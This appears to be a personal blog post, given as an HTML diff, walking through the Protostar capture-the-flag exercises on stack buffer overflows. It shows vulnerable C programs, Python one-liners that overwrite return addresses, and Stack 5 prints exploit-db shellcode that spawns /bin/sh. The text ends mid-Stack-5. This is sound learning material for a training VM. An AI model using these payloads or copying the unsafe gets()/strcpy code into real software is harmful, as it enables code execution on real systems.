@@ -1,0 +1,1768 @@
+<!DOCTYPE html>
+<!--
+    So Simple Jekyll Theme 3.2.0
+    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
+
+  
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Protostar CTF | Cloud Castle Chaos</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Protostar CTF" />
+<meta name="author" content="P2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF by Andrew Griffiths @ https://exploit.education/protostar/ This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics." />
+<meta property="og:description" content="CTF by Andrew Griffiths @ https://exploit.education/protostar/ This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics." />
+<link rel="canonical" href="http://localhost:4000/ctf/2023/11/06/Protostar.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2023/11/06/Protostar.html" />
+<meta property="og:site_name" content="Cloud Castle Chaos" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-06T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Protostar CTF" />
+<meta name="twitter:site" content="@mmistakes" />
+<meta name="twitter:creator" content="@P2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"P2"},"dateModified":"2023-11-06T00:00:00+01:00","datePublished":"2023-11-06T00:00:00+01:00","description":"CTF by Andrew Griffiths @ https://exploit.education/protostar/ This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.","headline":"Protostar CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2023/11/06/Protostar.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/images/logo.png"},"name":"P2"},"url":"http://localhost:4000/ctf/2023/11/06/Protostar.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/skins/default.css">
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i">
+  <link rel="alternate" type="application/atom+xml" title="Cloud Castle Chaos" href="/atom.xml">
+<!-- start custom head snippets -->
+
+<!-- insert favicons. use http://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+</head>
+
+
+  <body class="layout--post  protostar-ctf">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+  <div class="navigation-wrapper">
+    <a href="#menu-toggle" id="menu-toggle">Menu</a>
+    <nav id="primary-nav" class="site-nav animated drop">
+      <ul><li><a href="/posts/">Posts</a></li><li><a href="/categories/">Categories</a></li><li><a href="/search/">Search</a></li></ul>
+    </nav>
+  </div><!-- /.navigation-wrapper -->
+
+
+    <header class="masthead">
+  <div class="wrap">
+    
+      <a href="/" class="site-logo" rel="home" title="Cloud Castle Chaos">
+        <img src="/images/logo.png" class="site-logo-img animated fadeInDown" alt="Cloud Castle Chaos">
+      </a>
+    
+    
+    
+      
+        <div class="site-description animated fadeIn"><a href="/">a bit of this. a bit of that.</a></div>
+      
+    
+  </div>
+</header><!-- /.masthead -->
+
+    <main id="main" class="main-content" aria-label="Content">
+  <article class="h-entry">
+    
+
+    <div class="page-wrapper">
+      <header class="page-header">
+        
+        
+          <h1 id="page-title" class="page-title p-name">Protostar CTF
+</h1>
+        
+      </header>
+
+      <div class="page-sidebar">
+        <div class="page-author h-card p-author"><img src="/images/profile.png" class="author-avatar u-photo" alt="P2"><div class="author-info"><div class="author-name">
+        <em>by</em> <span class="p-name">P2</span>
+      </div><ul class="author-links"><li class="author-link">
+            <a class="u-url" rel="me" href=""><i class="fas fa-link fa-lg" title=""></i></a>
+          </li></ul>
+
+<span class="read-time">54 min read</span>
+
+    <time class="page-date dt-published" datetime="2023-11-06T00:00:00+01:00"><a class="u-url" href="">November 6, 2023</a>
+</time>
+
+  </div>
+</div>
+
+        
+  <h3 class="page-taxonomies-title">Categories</h3>
+  
+  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="/categories/#ctf" title="Pages filed under CTF">CTF</a></li>
+  </ul>
+
+
+        
+
+      </div>
+
+      <div class="page-content">
+        <div class="e-content">
+          <p><img src="https://cdn.pixabay.com/photo/2011/12/14/12/17/galaxy-11098_1280.jpg" alt="center-aligned-image" class="align-center" /></p>
+
+<p class="notice--info">CTF by <strong>Andrew Griffiths</strong> @ <a href="https://exploit.education/protostar/">https://exploit.education/protostar/</a></p>
+
+<p>This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering.
+I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.</p>
+
+<!--more-->
+
+<table>
+  <thead>
+    <tr>
+      <th>Content:</th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#install">Install</a></td>
+      <td><a href="#stack-00">Stack 0</a></td>
+      <td><a href="#format-00">Format 0</a></td>
+      <td><a href="#heap-00">Heap 0</a></td>
+      <td><a href="#net-00">Net 0</a></td>
+      <td><a href="#final-00">Final 0</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-01">Stack 1</a></td>
+      <td><a href="#format-01">Format 1</a></td>
+      <td><a href="#heap-01">Heap 1</a></td>
+      <td><a href="#net-01">Net 1</a></td>
+      <td><a href="#final-01">Final 1</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-02">Stack 2</a></td>
+      <td><a href="#format-02">Format 2</a></td>
+      <td><a href="#heap-02">Heap 2</a></td>
+      <td><a href="#net-02">Net 2</a></td>
+      <td><a href="#final-02">Final 2</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-03">Stack 3</a></td>
+      <td><a href="#format-03">Format 3</a></td>
+      <td><a href="#heap-03">Heap 3</a></td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-04">Stack 4</a></td>
+      <td><a href="#format-04">Format 4</a></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-05">Stack 5</a></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-06">Stack 6</a></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#stack-07">Stack 7</a></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="capture-the-flag">Capture the Flag</h1>
+
+<h3 id="install">[Install]</h3>
+<p>The CTF is downloadable as ISO image, and needs to be mounted. <br />
+To mount it use VirtualBox (or VMware or similar) and create a Debian 32bits machine, then pass the iso as bootable media. <br />
+For each level, access the machine with the username “user” and the password “user”.
+To access, retrieve the IP of the CTF machine, for example with the <code class="language-plaintext highlighter-rouge">ip a</code> command.
+Then connect to the machine with SSH, using the credentials and the command ssh user@[ipaddr]. <br />
+All the challenges are stored in <code class="language-plaintext highlighter-rouge">/opt/protostar/bin/</code>. <br />
+If you want to install anything in the VM, you can login with the <code class="language-plaintext highlighter-rouge">godmode:godmode</code> credentials. <br />
+<em>Protostar is little endian, this is important to keep in mind when playing with direct memory access</em></p>
+
+<h3 id="stack-00">[Stack 00]</h3>
+<p>Memory can be accessed outside of its allocated region.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have changed the 'modified' variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Buffer overflow: this bug happens when a program, while writing data to a buffer, overruns the buffer’s boundary and overwrites adjacent memory locations. Buffer overflows can often be triggered by assuming all the inputs are smaller than a certain size and allocating just that size for the buffer: in case an input happens to be larger, it will be written past the end of the buffer.</p>
+</blockquote>
+
+<ol>
+  <li>The program declares an integer variable and a buffer of static length 64 bytes. This means that memory will look as follows (remember, protostar is little endian): <code class="language-plaintext highlighter-rouge">modified ; modified ; modified ; buffer[63] ; buffer[62] ; ... ; buffer[1] ; buffer[0]</code></li>
+  <li>The goal is to overwrite the “modified” variable, meaning that we have to write out of the boundaries of the buffer. Luckily there are no boundary checks in place.</li>
+  <li>The only thing we have to do is to start ``./stack0` and give it an input string longer than 64 chars. The additional chars will spill out of the buffer and overwrite the memory cell of the “modified” variable.</li>
+</ol>
+
+<h3 id="stack-01">[Stack 01]</h3>
+<p>Modify variables to specific values.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please specify an argument</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>ASCII: this is a character encoding standard: it encodes 128 specified characters into seven-bit integers as shown by the ASCII chart (you can see it in a terminal by tayping man ascii). Ninety-five of the encoded characters are printable: these include the digits 0 to 9, lowercase letters a to z, uppercase letters A to Z, and punctuation symbols.</p>
+</blockquote>
+
+<ol>
+  <li>What the program does is basically the same as in stack0. The main difference is that we have to pass the string as a parameter when we start ./stack1, instead of the program itself reading it from standard input.</li>
+  <li>Instead of overwriting the variable with no matter what, we have to make the value correspond with the expected check: 0x61626364. We can’t write the numbers directly, as every number will be interpreted as a char and therefore not correspond. However, taking a look at the ASCII table we see that the values correspond to a, b, c and d.</li>
+  <li>Remembering that the system is little endian, it means that the string has to be passed as “dcba”. As in the previous level, whatever are the first 64 characters does not matter. We can therefore do the following: <code class="language-plaintext highlighter-rouge">./stack1 1111111111111111111111111111111111111111111111111111111111111111dcba</code></li>
+</ol>
+
+<h3 id="stack-02">[Stack 02]</h3>
+<p>Look at environment variables, and how they can be set.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>
+
+    <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"GREENIE"</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly modified the variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Environment Variable: it’ss a dynamic-named value that can affect the way a processes will behave on a computer. These variables are part of the environment in which a process runs, and they can be queried to find out paths to specific files or directories.</p>
+</blockquote>
+
+<ol>
+  <li>Exactly as in the previous levels, we have to fill the buffer and then add some to overwrite the desired memory. However in this case the string is not taken as parameter nor from the standard input: it is instead read directly from an environment variable.</li>
+  <li>To assign a value to an environment variable it is enough to run <code class="language-plaintext highlighter-rouge">export VARNAME=xxxx</code>. However, we can not reutilize the string we passed the last time because in this case the expected string is made of special characters. If we look in the ASCII table they correspond to the new line and carriage return, and we can not represent them in a single char in our string.</li>
+  <li>To go around the problem we can try to set the variable using python, which allows to print the raw byte values:
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">export</span> <span class="n">GREENIE</span><span class="o">=</span><span class="sb">`python -c "print '1' * 64 + '\x0a\x0d\x0a\x0d'"`</span>
+</code></pre></div>    </div>
+  </li>
+  <li>However, if we run this line the terminal will complain about a bad variable name, and only store the part with 1s.</li>
+  <li>Therefore, we have to set the variable directly when launching the program. This is possible by giving the variable name and its value in before the usual program launch command, all in the same line:
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">GREENIE</span><span class="o">=</span><span class="sb">`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"`</span> <span class="p">.</span><span class="o">/</span><span class="n">stack2</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="stack-03">[Stack 03]</h3>
+<p>Overwrite function pointers stored on the stack.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+        <span class="n">fp</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>objdump: this command displays information about an object file. It has many parameters that change what is shown: among other possibilities you can see the content of the headers and sections, some disassembly, symbol tables, formats and architectures.</p>
+</blockquote>
+
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>: the vertical line is used to pump output from an instruction to the next instruction</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<ol>
+  <li>As in the previous challenges, we have to overwrite a variable by overflowing the input buffer. This time the string is read from stdin, but it will again be made of special characters because we have to provide an address.</li>
+  <li>
+    <p>This address is a pointer to the location of the <code class="language-plaintext highlighter-rouge">win()</code> method. So the first thing to do is to find out where that method is:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     objdump <span class="nt">-t</span> stack3 | <span class="nb">grep </span>win <span class="c"># use grep to get only relevant output</span>
+</code></pre></div>    </div>
+  </li>
+  <li>This shows that the function is at address 0x08048424. Remembering that the system is little endian, it means that we will have to pass it as a string of form \x24\x84\x04\x08.</li>
+  <li>As in the previous challenge, we have to use a workaround to get the special characters properly. We don’t have to write any variable, so we can do directly <code class="language-plaintext highlighter-rouge">python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3.</code></li>
+</ol>
+
+<h3 id="stack-04">[Stack 04]</h3>
+<p>Overwrit saved EIP and standard buffer overflows.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>EIP: it’s a 32 bit register, also called the instruction pointer because Instruction it holds the next instruction address. Based on usual calling conventions, the call instruction pushes the current $eip onto the stack before jumping to the memory address of the called function by setting $eip to that address. The ret instruction at the end of the function will pop the old $eip value, located at that moment on the stack at $ebp + 4, and restore it to continue the execution.</p>
+</blockquote>
+
+<ol>
+  <li>This challenge is slightly different from the previous ones, because we don’t have a variable to overwrite. Instead we have to overwrite a register, which is not immediately after the memory allocated for the buffer.</li>
+  <li>To find out what the address of <code class="language-plaintext highlighter-rouge">$eip</code> is we can use gdb and ask for <code class="language-plaintext highlighter-rouge">info reg</code>. This tells us that <code class="language-plaintext highlighter-rouge">$eip</code> is at address 0x8048411</li>
+  <li>What we have to find out now is how far the <code class="language-plaintext highlighter-rouge">$eip</code> location is from our buffer, so that we can calculate how many chars we have to pass to overwrite the right location. We could look at the address of the buffer itself, with for example IDA Pro or GDB and a little work to calculate the locations. Or we could use a tool like <em>Buffer Overflow EIP Offset String Generator</em>, which will generate a unique string that we feed to the program, and by giving back the content of $eip to the service it will tell us the offset between the start of the string (in our case corresponding to the address of the buffer) and the start of the $eip content (corresponding to the address of $eip).</li>
+  <li>We start the program in gdb and let it run. When the input is needed, we paste the string generated by the service mentioned in the previous step. When we hit enter, the program will end up in a segmentation fault because it is trying to access an address that does not exist. That’s the moment to check our register with <code class="language-plaintext highlighter-rouge">x/w $eip</code>, and see what is the content (which by the way corresponds to the address that caused the segmentation fault). We copy it back to the service, which tells us that the offset we are looking for is 76.</li>
+  <li>Now that we know how long our non-relevant string has to be, we can retrieve the relevant part: the address of the <code class="language-plaintext highlighter-rouge">win()</code> method. We use objdump again, and we obtain the address 0x080483f4.</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>Exactly as the previous challenge, we can trigger the overflow and redirect the execution to the <code class="language-plaintext highlighter-rouge">win()</code><code class="language-plaintext highlighter-rouge"> method with </code>python -c “print ‘A’ * 76 + ‘\xF4\x83\x04\x08’”</td>
+          <td>./stack4`</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ol>
+
+<h3 id="stack-05">[Stack 05]</h3>
+<p>Standard buffer overflow, introducing shellcode.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Shellcode: this is a small piece of self-contained code used as payload in the exploitation of a software vulnerability. It is called “shellcode” because it typically starts a command shell from which the attacker can control the compromised machine, but it can actually do anything. Shellcodes can be encoded in many different ways, the most simple translates high level instructions to the corresponding assembly and from there to the corresponding opcodes, which are just hex values.</p>
+</blockquote>
+
+<ol>
+  <li>This challenge starts exactly the same as the previous one: our goal is to overwrite <code class="language-plaintext highlighter-rouge">$eip</code> with the address of our own code. To know how much input we have to give to reach $eip and overwriting it properly we can do exactly the same steps as previous: take the input from the website, execute the program in gdb, pass the input and when it crashes give it back to the website. The result is that once again we need 76 bytes to reach $eip, and that $eip is at address 0x8048411</li>
+  <li>
+    <p>However this time we don’t have a pre-written function to redirect our flow to. The goal is to use our own shellcode (well, not necessarily written by us, but passed to the program by us), and the only way to inject it in the program is to put it as our input for the buffer. We will use this shellcode from exploit-db:</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cm">/* The asm instructions correspond t:
+     * close(0) 
+     * open("/dev/tty", O_RDWR | ...)
+     * execve("/bin/sh", ["/bin/sh"], NULL)
+ */</span>
+        
+ <span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> 
+ <span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x06\xcd\x80</span><span class="s">"</span>
+ <span class="s">"</span><span class="se">\x53\x68</span><span class="s">/tty</span><span class="se">\x68</span><span class="s">/dev</span><span class="se">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80</span><span class="s">"</span>
+ <span class="s">"</span><span class="se">\x31\xc0\x50\x68</span><span class="s">//sh</span><span class="se">\x68</span><span class="s">/bin</span><span class="se">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Now we have our input made by the shellcode and the padding (meaning a bunch of \x00 bytes) we need to reach $eip. But we do not know yet what we have to write in $eip: we will have to pass the starting address of the buffer, where the program will find the start of the shellcode.</li>
+  <li>
+    <p>By disassembling stack5 with <code class="language-plaintext highlighter-rouge">objdump -d</code> we can see that the address of the buffer passed as argument to the gets method is loaded in $eax and is located at $esp+0x10. This means that the address we are looking for corresponds to $esp+0x10, and from gdb we can see that $esp is located at 0xbffffb70.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">080483</span><span class="n">c4</span> <span class="n">main</span><span class="o">:</span>
+ <span class="mi">80483</span><span class="n">c4</span><span class="o">:</span>   <span class="mi">55</span>                      <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
+ <span class="mi">80483</span><span class="n">c5</span><span class="o">:</span>   <span class="mi">89</span> <span class="n">e5</span>                   <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
+ <span class="mi">80483</span><span class="n">c7</span><span class="o">:</span>   <span class="mi">83</span> <span class="n">e4</span> <span class="n">f0</span>                <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+ <span class="mi">80483</span><span class="n">ca</span><span class="o">:</span>   <span class="mi">83</span> <span class="n">ec</span> <span class="mi">50</span>                <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x50</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+ <span class="mi">80483</span><span class="n">cd</span><span class="o">:</span>   <span class="mi">8</span><span class="n">d</span> <span class="mi">44</span> <span class="mi">24</span> <span class="mi">10</span>             <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
+ <span class="mi">80483</span><span class="n">d1</span><span class="o">:</span>   <span class="mi">89</span> <span class="mo">04</span> <span class="mi">24</span>                <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+ <span class="mi">80483</span><span class="n">d4</span><span class="o">:</span>   <span class="n">e8</span> <span class="mi">0</span><span class="n">f</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mf">80482e8</span> <span class="n">gets</span><span class="err">@</span><span class="n">plt</span>
+ <span class="mi">80483</span><span class="n">d9</span><span class="o">:</span>   <span class="n">c9</span>                      <span class="n">leave</span>  
+ <span class="mi">80483</span><span class="n">da</span><span class="o">:</span>   <span class="n">c3</span>                      <span class="n">ret</span>  
+</code></pre></div>    </div>
+  </li>
+  <li>The problem is that the actual address of $esp might change on the stack depending on how the program is loaded. So we need another way to access the buffer. What we can see from the disassembly is that the address is loaded in $eax. This means that if we find an instruction like jmp $eax at a static address we could use that address for our new $eip, and the jump will take care of getting us at the right spot.</li>
+  <li>To find that gadget we can use a tool like <code class="language-plaintext highlighter-rouge">msfelfscan</code>: by passing the object file and the type of instruction (in our case -j) we are looking for it will return all the addresses where we can find one. Therefore we run <code class="language-plaintext highlighter-rouge">msfelfscan -f stack5 -j eax</code> and see that we can use the instruction <code class="language-plaintext highlighter-rouge">call eax</code> at 0x080483bf for our goal.</li>
+  <li>
+    <p>Our current payload is made by the shellcode, a padding of 76-len(shellcode) 0-bytes and the address of our call eax instruction.</p>
+
